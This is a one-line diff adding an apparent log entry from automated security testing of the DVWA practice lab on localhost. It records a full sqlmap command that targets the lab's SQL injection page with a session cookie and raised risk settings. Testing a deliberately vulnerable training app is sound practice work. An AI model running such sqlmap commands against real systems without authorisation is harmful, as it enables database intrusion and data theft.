@@ -1,0 +1,1 @@
+http://localhost:8090/vulnerabilities/sqli/?id=1&Submit=Submit (GET)  # /usr/bin/sqlmap -u http://localhost:8090/vulnerabilities/sqli/?id=1&Submit=Submit "--cookie=PHPSESSID=a5db33aa61105edfd25503fdbf7336f0; security=low" --dbms=mysql --level=3 --risk=2 --batch --timeout=30 -p id --output-dir=results/live/sqlmap_targeted/dvwa
